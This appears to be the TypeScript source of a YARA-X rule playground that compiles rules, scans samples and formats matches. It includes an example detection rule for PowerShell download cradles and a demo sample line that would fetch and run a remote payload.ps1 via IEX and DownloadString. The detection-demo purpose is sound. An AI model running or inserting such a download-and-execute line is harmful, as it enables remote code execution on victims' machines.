import { Compiler } from '@virustotal/yara-x'

export interface Diagnostic {
  severity: 'error' | 'warning'
  /** Full compiler report, with the source line and caret */
  text: string
  /** First line, e.g. "error[E009]: unknown identifier `foo`" */
  title: string
  line?: number
  column?: number
}

export interface PatternMatch {
  offset: number
  length: number
  /** Matched bytes (at most SNIPPET_BYTES) as spaced hex and printable ASCII */
  hex: string
  ascii: string
  truncated: boolean
}

export interface RuleMatch {
  identifier: string
  namespace: string
  tags: string[]
  metadata: { identifier: string; value: unknown }[]
  patterns: { identifier: string; kind: string; matches: PatternMatch[] }[]
}

export interface Sample {
  name: string
  bytes: Uint8Array
}

export interface SampleResult {
  name: string
  size: number
  matches: RuleMatch[]
  error?: string
}

export interface YaraResult {
  diagnostics: Diagnostic[]
  /** Absent when the rules did not compile */
  samples?: SampleResult[]
}

export const SNIPPET_BYTES = 32
export const MAX_MATCHES_PER_PATTERN = 100

/** Splits a YARA-X compiler report ("error[E009]: … \n --> line:2:47 …") into title and position. */
export function parseDiagnostic(text: string, severity: Diagnostic['severity']): Diagnostic {
  const pos = /-->\s*line:(\d+):(\d+)/.exec(text)
  return {
    severity,
    text,
    title: text.split('\n', 1)[0] ?? text,
    ...(pos && { line: Number(pos[1]), column: Number(pos[2]) }),
  }
}

/** Hex and ASCII (non-printables as ".") of `bytes[offset, offset + length)`, capped at SNIPPET_BYTES. */
export function snippet(bytes: Uint8Array, offset: number, length: number): Omit<PatternMatch, 'offset' | 'length'> {
  const slice = bytes.subarray(offset, offset + Math.min(length, SNIPPET_BYTES))
  return {
    hex: Array.from(slice, (b) => b.toString(16).padStart(2, '0')).join(' '),
    ascii: Array.from(slice, (b) => (b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : '.')).join(''),
    truncated: length > SNIPPET_BYTES,
  }
}

interface RawMatch {
  identifier: string
  namespace: string
  tags: string[]
  metadata: { identifier: string; value: unknown }[]
  patterns: { identifier: string; kind: string; matches: { offset: number; length: number }[] }[]
}

/** Compiles `source` and scans every sample. The YARA-X wasm module must already be initialised. */
export function compileAndScan(source: string, samples: Sample[]): YaraResult {
  const compiler = new Compiler()
  try {
    try {
      compiler.addSource(source)
    } catch {
      // addSource throws on the first error; compiler.errors has all of them
    }
    const diagnostics = [
      ...compiler.errors.map((t) => parseDiagnostic(t, 'error')),
      ...compiler.warnings.map((t) => parseDiagnostic(t, 'warning')),
    ]
    if (compiler.errors.length) return { diagnostics }
    const rules = compiler.build()
    const scanner = rules.scanner()
    scanner.setMaxMatchesPerPattern(MAX_MATCHES_PER_PATTERN)
    try {
      return {
        diagnostics,
        samples: samples.map(({ name, bytes }) => {
          try {
            const result = scanner.scan(bytes) as { matches: RawMatch[] }
            return {
              name,
              size: bytes.length,
              matches: result.matches.map((m) => ({
                identifier: m.identifier,
                namespace: m.namespace,
                tags: m.tags,
                metadata: m.metadata,
                patterns: m.patterns
                  .filter((p) => p.matches.length)
                  .map((p) => ({
                    identifier: p.identifier,
                    kind: p.kind,
                    matches: p.matches.map((x) => ({ ...x, ...snippet(bytes, x.offset, x.length) })),
                  })),
              })),
            }
          } catch (e) {
            return { name, size: bytes.length, matches: [], error: e instanceof Error ? e.message : String(e) }
          }
        }),
      }
    } finally {
      scanner.free()
      rules.free()
    }
  } finally {
    compiler.free()
  }
}

export const EXAMPLE_RULE = `import "math"

rule Suspicious_PowerShell_Download : powershell downloader
{
    meta:
        description = "PowerShell that downloads and runs a remote payload"
        author = "good.tools example"
        severity = 7
        reference = "https://virustotal.github.io/yara-x/"

    strings:
        $ps = "powershell" nocase
        $iex = /I(nvoke-)?EX(pression)?\\s*\\(/ nocase
        $dl1 = "DownloadString" nocase
        $dl2 = "DownloadFile" nocase
        $enc = /-e(nc(odedcommand)?)?\\s+[A-Za-z0-9+\\/=]{20,}/ nocase
        $mz = { 4D 5A 90 00 }

    condition:
        $ps and ($iex or $enc) and any of ($dl*)
        or ($mz at 0 and math.entropy(0, filesize) > 7.0)
}

rule Contains_URL : network
{
    strings:
        $url = /https?:\\/\\/[a-zA-Z0-9.\\-]+(\\/[^\\s"']*)?/

    condition:
        #url >= 1
}
`

export const EXAMPLE_SAMPLE = `$wc = New-Object System.Net.WebClient
powershell -NoProfile -Command "IEX ($wc.DownloadString('http://example.com/payload.ps1'))"
`
